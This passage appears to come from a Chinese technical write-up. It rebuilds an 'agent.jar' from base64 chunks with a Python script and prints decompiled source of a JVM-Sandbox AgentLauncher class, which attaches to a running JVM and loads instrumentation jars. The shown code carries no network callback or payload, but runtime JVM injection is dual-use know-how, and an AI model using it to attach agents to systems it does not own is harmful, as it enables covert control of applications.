NV9NLNIcy9KwvlLZV5mrLh+q4f3n/q4ksxyqXrEdeJL0AItxilchtR/BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf/I6efFkRNULoNKTNB+j12jCq3AMyxB/iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW/8zySHy9bGf1Wfxz8ciUAAoq5Wk4/ply/DZ/vwB/s5DyLXObrewGZeVBzg==&quot;</span>,<br><span class="hljs-string">&quot;K+SCBPvFdtlhu5tgNk/TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy/5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>,<br><span class="hljs-string">&quot;WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;agent.jar&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        f.write(base64.b64decode(i))<br></code></pre></td></tr></table></figure><p>反编译后的源码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//  </span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA  </span><br><span class="hljs-comment">// (powered by FernFlower decompiler)  </span><br><span class="hljs-comment">//  </span><br><br><span class="hljs-keyword">package</span> com.alibaba.jvm.sandbox.agent;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileWriter;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;  <br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;  <br><span class="hljs-keyword">import</span> java.util.LinkedHashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;  <br><span class="hljs-keyword">import</span> java.util.jar.JarFile;  <br><span class="hljs-keyword">import</span> java.util.regex.Matcher;  <br><span class="hljs-keyword">import</span> java.util.regex.Pattern;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentLauncher</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SANDBOX_HOME</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(AgentLauncher.class.getProtectionDomain().getCodeSource().getLocation().getFile())).getParentFile().getParent();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SANDBOX_USER_MODULE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_AGENT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;agent&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_ATTACH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;attach&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String LAUNCH_MODE;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String RESULT_FILE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, SandboxClassLoader&gt; sandboxClassLoaderMap;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_CORE_CONFIGURE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_PROXY_CORE_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EMPTY_STRING</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SANDBOX_HOME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;home&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;namespace&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;default&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.ip&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;token&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PROPERTIES_FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prop&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String OS;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentLauncher</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCfgPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;cfg&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxModulePath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;module&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCoreJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-core.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxSpyJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-spy.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxPropertiesPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> getSandboxCfgPath(sandboxHome);  <br>        <span class="hljs-keyword">return</span> var10000 + File.separator + <span class="hljs-string">&quot;sandbox.properties&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxProviderPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;provider&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;agent&quot;</span>;  <br>        install(toFeatureMap(featureString), inst);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;attach&quot;</span>;  <br>        Map&lt;String, String&gt; featureMap = toFeatureMap(featureString);  <br>        writeAttachResult(getNamespace(featureMap), getToken(featureMap), install(featureMap, inst));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeAttachResult</span><span class="hljs-params">(String namespace, String token, InetSocketAddress local)</span> &#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(RESULT_FILE_PATH);  <br>        <span class="hljs-keyword">if</span> (!file.exists() || file.isFile() &amp;&amp; file.canWrite()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(file, <span class="hljs-literal">true</span>);  <br><br>                <span class="hljs-keyword">try</span> &#123;  <br>                    fw.append(String.format(<span class="hljs-string">&quot;%s;%s;%s;%s\n&quot;</span>, namespace, token, local.getHostName(), local.getPort()));  <br>                    fw.flush();  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var8) &#123;  <br>                    <span class="hljs-keyword">try</span> &#123;  <br>                        fw.close();  <br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var7) &#123;  <br>                        var8.addSuppressed(var7);  <br>                    &#125;  <br><br>                    <span class="hljs-keyword">throw</span> var8;  <br>                &#125;  <br><br>                fw.close();  <br>            &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;write to result file : &quot;</span> + file + <span class="hljs-string">&quot; failed.&quot;</span>);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> ClassLoader <span class="hljs-title function_">loadOrDefineClassLoader</span><span class="hljs-params">(String namespace, String coreJar)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        SandboxClassLoader classLoader;  <br>        <span class="hljs-keyword">if</span> (sandboxClassLoaderMap.containsKey(namespace) &amp;&amp; <span class="hljs-literal">null</span> != sandboxClassLoaderMap.get(namespace)) &#123;  <br>            classLoader = (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            classLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SandboxClassLoader</span>(namespace, coreJar);  <br>            sandboxClassLoaderMap.put(namespace, classLoader);  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> classLoader;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uninstall</span><span class="hljs-params">(String namespace)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-type">SandboxClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != sandboxClassLoader) &#123;  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>));  <br>            sandboxClassLoader.closeIfPossible();  <br>            sandboxClassLoaderMap.remove(namespace);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> InetSocketAddress <span class="hljs-title function_">install</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap, Instrumentation inst)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">namespace</span> <span class="hljs-operator">=</span> getNamespace(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">propertiesFilePath</span> <span class="hljs-operator">=</span> getPropertiesFilePath(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">coreFeatureString</span> <span class="hljs-operator">=</span> toFeatureString(featureMap);  <br><br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>            inst.appendToBootstrapClassLoaderSearch(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getSandboxSpyJarPath(home))));  <br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> loadOrDefineClassLoader(namespace, getSandboxCoreJarPath(home));  <br>            Class&lt;?&gt; classOfConfigure = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfCoreConfigure</span> <span class="hljs-operator">=</span> classOfConfigure.getMethod(<span class="hljs-string">&quot;toConfigure&quot;</span>, String.class, String.class).invoke((Object)<span class="hljs-literal">null</span>, coreFeatureString, propertiesFilePath);  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfProxyServer</span> <span class="hljs-operator">=</span> classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isBind</span> <span class="hljs-operator">=</span> (Boolean)classOfProxyServer.getMethod(<span class="hljs-string">&quot;isBind&quot;</span>).invoke(objectOfProxyServer);  <br>            <span class="hljs-keyword">if</span> (!isBind) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;bind&quot;</span>, classOfConfigure, Instrumentation.class).invoke(objectOfProxyServer, objectOfCoreConfigure, inst);  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var13) &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(objectOfProxyServer);  <br>                    <span class="hljs-keyword">throw</span> var13;  <br>                &#125;  <br>            &#125;  <br><br>            <span class="hljs-keyword">return</span> (InetSocketAddress)classOfProxyServer.getMethod(<span class="hljs-string">&quot;getLocal&quot;</span>).invoke(objectOfProxyServer);  <br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var14) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;sandbox attach failed.&quot;</span>, var14);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != string &amp;&amp; string.length() &gt; <span class="hljs-number">0</span> &amp;&amp; !string.matches(<span class="hljs-string">&quot;^\\s*$&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> !isNotBlankString(string);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefaultString</span><span class="hljs-params">(String string, String defaultString)</span> &#123;  <br>        <span class="hljs-keyword">return</span> isNotBlankString(string) ? string : defaultString;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, String&gt; <span class="hljs-title function_">toFeatureMap</span><span class="hljs-params">(String featureString)</span> &#123;  <br>        Map&lt;String, String&gt; featureMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();  <br>        <span class="hljs-keyword">if</span> (isBlankString(featureString)) &#123;  <br>            <span class="hljs-keyword">return</span> featureMap;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            String[] kvPairSegmentArray = featureString.split(<span class="hljs-string">&quot;;&quot;</span>);  <br>            <span class="hljs-keyword">if</span> (kvPairSegmentArray.length == <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                String[] var3 = kvPairSegmentArray;  <br>                <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> kvPairSegmentArray.length;  <br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;  <br>                    <span class="hljs-type">String</span> <span class="hljs-variable">kvPairSegmentString</span> <span class="hljs-operator">=</span> var3[var5];  <br>                    <span class="hljs-keyword">if</span> (!isBlankString(kvPairSegmentString)) &#123;  <br>                        String[] kvSegmentArray = kvPairSegmentString.split(<span class="hljs-string">&quot;=&quot;</span>);  <br>                        <span class="hljs-keyword">if</span> (kvSegmentArray.length == <span class="hljs-number">2</span> &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">0</span>]) &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">1</span>])) &#123;  <br>                            featureMap.put(kvSegmentArray[<span class="hljs-number">0</span>], kvSegmentArray[<span class="hljs-number">1</span>]);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br><br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefault</span><span class="hljs-params">(Map&lt;String, String&gt; map, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != map &amp;&amp; !map.isEmpty() ? getDefaultString((String)map.get(key), defaultValue) : defaultValue;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWindows</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> OS.contains(<span class="hljs-string">&quot;win&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxHome</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getDefault(featureMap, <span class="hljs-string">&quot;home&quot;</span>, DEFAULT_SANDBOX_HOME);  <br>        <span class="hljs-keyword">if</span> (isWindows()) &#123;  <br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(?i)^[/\\\\]([a-z])[/\\\\]&quot;</span>).matcher(home);  <br>            <span class="hljs-keyword">if</span> (m.find()) &#123;  <br>                home = m.replaceFirst(<span class="hljs-string">&quot;$1:/&quot;</span>);  <br>            &#125;  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> home;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getNamespace</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;namespace&quot;</span>, <span class="hljs-string">&quot;default&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getToken</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPropertiesFilePath</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;prop&quot;</span>, getSandboxPropertiesPath(getSandboxHome(featureMap)));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendFromFeatureMap</span><span class="hljs-params">(StringBuilder featureSB, Map&lt;String, String&gt; featureMap, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (featureMap.containsKey(key)) &#123;  <br>            featureSB.append(String.format(<span class="hljs-string">&quot;%s=%s;&quot;</span>, key, getDefault(featureMap, key, defaultValue)));  <br>        &#125;  <br><br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toFeatureString</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">sandboxHome</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">featureSB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(String.format(<span 